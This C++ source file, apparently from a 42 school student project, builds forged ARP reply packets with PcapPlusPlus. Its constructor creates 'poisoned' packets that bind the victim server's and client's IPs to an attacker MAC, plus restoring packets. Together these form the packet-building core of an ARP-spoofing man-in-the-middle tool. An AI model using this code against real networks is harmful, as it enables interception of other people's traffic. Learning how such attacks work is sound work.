/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Poisoner.cpp                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hoannguy <hoannguy@student.42lausanne.c    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/07/07 23:23:41 by hoannguy          #+#    #+#             */
/*   Updated: 2026/07/08 22:07:02 by hoannguy         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "Poisoner.hpp"

Poisoner::Poisoner(Victims &victims, pcpp::MacAddress poison_mac) {
	this->poison_mac = poison_mac;
	
	pcpp::MacAddress s_mac = victims.get_Mac(SERVER);
	pcpp::IPv4Address s_ip = victims.get_Ip(SERVER);
	pcpp::MacAddress c_mac = victims.get_Mac(CLIENT);
	pcpp::IPv4Address c_ip = victims.get_Ip(CLIENT);
	
	this->poisoned_server_packet = create_packet(poison_mac, s_mac, c_ip, s_ip);
	this->poisoned_client_packet = create_packet(poison_mac, c_mac, s_ip, c_ip);
	this->good_server_packet = create_packet(c_mac, s_mac, c_ip, s_ip);
	this->good_client_packet = create_packet(s_mac, c_mac, s_ip, c_ip);
}

Poisoner::~Poisoner() {

}

pcpp::Packet Poisoner::create_packet(
	pcpp::MacAddress m_src,
	pcpp::MacAddress m_dest,
	pcpp::IPv4Address i_src,
	pcpp::IPv4Address i_dest
) {
	pcpp::EthLayer *ethernetLayer = new pcpp::EthLayer(m_src, m_dest);
	pcpp::ArpLayer *arpLayer = new pcpp::ArpLayer(pcpp::ArpReply(m_src, i_src, m_dest, i_dest));
	pcpp::Packet newPacket(100);
	newPacket.addLayer(ethernetLayer, true);
	newPacket.addLayer(arpLayer, true);
	newPacket.computeCalculateFields();
	return newPacket;
}
